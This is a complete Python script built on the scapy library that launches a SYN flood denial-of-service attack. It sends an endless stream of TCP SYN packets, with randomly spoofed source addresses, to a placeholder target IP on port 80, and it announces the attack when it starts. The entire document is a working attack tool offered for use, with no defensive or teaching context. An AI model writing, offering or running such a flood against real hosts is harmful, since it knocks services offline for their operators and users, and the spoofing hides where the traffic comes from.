from scapy.all import *

# Set the target IP and port
target_ip = "TARGET_IP"
target_port = 80

# Function to generate and send SYN packets
def syn_flood(target_ip, target_port):
    while True:
        # Create a random source IP address
        src_ip = RandIP()

        # Generate a SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")

        # Send the packet
        send(packet, verbose=False)

if __name__ == "__main__":
    print(f"Starting SYN Flood attack on {target_ip}:{target_port}...")
    syn_flood(target_ip, target_port)
